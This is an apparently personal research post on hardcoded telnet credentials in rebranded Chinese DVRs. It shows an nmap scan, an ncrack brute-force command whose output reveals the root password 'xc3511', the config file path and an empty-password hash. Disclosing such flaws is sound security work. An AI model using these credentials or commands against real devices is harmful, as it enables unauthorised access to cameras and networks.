Hardcoded telnet login\password in Chinese DVR, like Dahua, RVI.

Also, it can be rebranded and sell under a different name.

Nmap report looks interesting:
Nmap scan report for 192.168.100.15
Host is up (0.0050s latency).
Not shown: 65527 closed ports

PORT      STATE    SERVICE        VERSION

23/tcp    open     telnet         BusyBox telnetd
81/tcp    open     http           uc-httpd 1.0.0
445/tcp   filtered microsoft-ds
4090/tcp  open     ssl/omasgport?
9527/tcp  open     unknown
9528/tcp  open     unknown
34567/tcp open     dhanalakshmi?
34599/tcp open     unknown

Device type: WAP
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.36
OS details: DD-WRT v24-sp1 (Linux 2.4.36)
Network Distance: 5 hops
Service Info: Host: LocalHost

And, with ncrack i "recover" hardcored telnet creds.

ncrack 192.168.100.15:23 -U logins.txt -P passwords.txt
Starting Ncrack 0.6 ( http://ncrack.org ) at 2018-05-26 13:06
Discovered credentials for telnet on 192.168.100.15 23/tcp:
192.168.100.15:23 23/tcp telnet: 'root' 'xc3511'
Ncrack done: 1 service scanned in 27.06 seconds.
Ncrack finished.

Web-ui configuration files are stored in /mnt/mtd/Config/, but i did not understand password hash in file Account1.
Also, in my case sed did not work. Empty password hash - tlJwpbo6.

Still work on this.
